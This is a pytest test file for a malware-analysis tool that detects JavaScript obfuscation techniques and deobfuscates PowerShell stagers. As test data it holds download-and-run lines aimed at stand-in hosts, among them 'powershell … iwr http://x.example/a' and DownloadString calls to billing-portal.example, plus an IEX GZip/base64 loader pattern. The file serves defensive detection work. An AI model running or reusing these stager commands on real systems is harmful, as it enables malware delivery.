"""Obfuscation techniques: static detectors, sandbox instrumentation and events."""

from __future__ import annotations

import importlib.util
from pathlib import Path

import pytest

from docutracex.parsers import javascript as J
from docutracex.parsers import js_techniques as jt


def _sample() -> str:
    spec = importlib.util.spec_from_file_location(
        "ms", Path(__file__).parents[1] / "scripts" / "make_samples.py")
    ms = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(ms)
    return ms.obf_techniques_js().decode("utf-8")


def _have_v8() -> bool:
    try:
        import STPyV8  # noqa: F401
        return True
    except Exception:  # noqa: BLE001
        return False


def test_static_techniques_on_sample() -> None:
    code = _sample()
    ids = {t["id"]: t for t in jt.static_techniques(code, J.metrics(code)["obfuscation_score"])}
    assert set(ids) == {"arithmetic_literals", "escape_block", "xor_decryptor", "iife_string",
                        "fromcharcode_arith", "payload_key_decryptor", "fake_header"}
    assert ids["escape_block"]["variable"] == "_0xa"
    assert ids["payload_key_decryptor"]["key"] == "Fact2024" and ids["payload_key_decryptor"]["decryptor"] == "dec"
    assert all(t["phase"] == "static" for t in ids.values())


def test_clean_code_has_no_techniques() -> None:
    code = "/* jQuery v3 */\nfunction add(a, b) { return a + b; }\nvar x = add(1, 2);\n"
    assert jt.static_techniques(code, 0) == []


def test_instrument_wraps_declared_xor_functions() -> None:
    code = "function d(a,k){var o='';for(var i=0;i<a.length;i++){o+=String.fromCharCode(a[i]^k.charCodeAt(i%k.length));}return o;}"
    out = jt.instrument(code)
    assert out.endswith(code) and "_dtx_log('xor','d'" in out


def test_from_sandbox_events() -> None:
    sb = {"log": [
        {"kind": "call", "name": "WScript.Sleep", "args": ["15000"]},
        {"kind": "timing", "name": "Date.getTime", "args": [""]},
        {"kind": "timing", "name": "Date.getTime", "args": [""]},
        {"kind": "fromcharcode", "name": "String.fromCharCode", "args": ["WScript"]},
        {"kind": "xor", "name": "dec", "args": ["powershell -nop -c iwr http://x.example/a"]},
    ]}
    ids = {t["id"]: t for t in jt.from_sandbox(sb)}
    assert {"antisandbox_timing", "fromcharcode_resolved", "xor_resolved", "dropped_payload"} <= set(ids)
    assert "15000" in ids["antisandbox_timing"]["evidence"]
    assert ids["dropped_payload"]["payload"].startswith("powershell")
    assert all(t["phase"] == "sandbox" for t in ids.values())


@pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
def test_sample_end_to_end(tmp_path: Path) -> None:
    f = tmp_path / "s.js"
    f.write_text(_sample(), encoding="utf-8")
    res = J.analyze(f, tmp_path, {})
    sc = res["scripts"][0]
    phases = {t["id"]: t["phase"] for t in sc["techniques"]}
    assert phases["payload_key_decryptor"] == "static" and phases["dropped_payload"] == "sandbox"
    assert "billing-portal.example" in next(t for t in sc["techniques"] if t["id"] == "dropped_payload")["payload"]
    rules = {x["rule"] for x in res["findings"]}
    assert {"js_dropped_payload", "js_antisandbox_timing", "js_payload_key_decryptor"} <= rules


def _ms():
    spec = importlib.util.spec_from_file_location(
        "ms2", Path(__file__).parents[1] / "scripts" / "make_samples.py")
    ms = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(ms)
    return ms


def test_ps_xor_deflate_stager_resolves_to_final_stage() -> None:
    from docutracex.parsers import ps_deobf
    r = ps_deobf.deobfuscate(_ms().xor_stager_ps1().decode())
    assert {"xor-base64", "xor-char-array", "decompress"} <= set(r["methods"])
    assert "DownloadString('http://billing-portal.example/inv/stage4.ps1')" in r["code"]
    assert "'http://billing-portal.example/inv/beacon'" in r["code"]


def test_ps_gzip_inline_and_numeric_key() -> None:
    import base64
    import zlib
    from docutracex.parsers import ps_deobf
    final = "Start-Process calc.exe"
    c = zlib.compressobj(9, zlib.DEFLATED, 31)
    b = base64.b64encode(c.compress(final.encode()) + c.flush()).decode()
    cmd = ("IEX (New-Object IO.StreamReader((New-Object IO.Compression.GZipStream([IO.MemoryStream]"
           f"[Convert]::FromBase64String('{b}'),[IO.Compression.CompressionMode]::Decompress)),"
           "[Text.Encoding]::ASCII)).ReadToEnd()")
    assert ps_deobf.deobfuscate(cmd)["code"].strip() == final
    x = base64.b64encode(bytes(ch ^ 0x41 for ch in final.encode())).decode()
    loop = f"$d = [Convert]::FromBase64String('{x}'); foreach ($i in 0..($d.Length-1)) {{ $d[$i] = $d[$i] -bxor 0x41 }}"
    assert final in ps_deobf.deobfuscate(loop)["code"]


def test_binary_base64_is_not_turned_into_garbage() -> None:
    import base64
    import random
    from docutracex.parsers import ps_deobf
    rnd = random.Random(1234)
    for _ in range(50):
        b = base64.b64encode(bytes(rnd.randrange(256) for _ in range(64))).decode()
        cmd = f"$x = [Convert]::FromBase64String('{b}')"
        assert ps_deobf.deobfuscate(cmd)["code"] == cmd


@pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
def test_js_to_powershell_full_chain(tmp_path: Path) -> None:
    from docutracex.parsers import powershell
    f = tmp_path / "c.js"
    f.write_bytes(_ms().chain_dropper_js())
    js = J.analyze(f, tmp_path / "none", {})
    ps = powershell.analyze(tmp_path / "x.bin", tmp_path / "none", {"javascript": js})
    assert len(ps["scripts"]) == 1                          # XOR result and Run() deduplicated
    sc = ps["scripts"][0]
    assert "stage4.ps1" in sc["code"] and "inv_viewer.exe" in sc["code"]
    assert {"ps_download", "ps_encoded"} <= {x["rule"] for x in ps["findings"]}
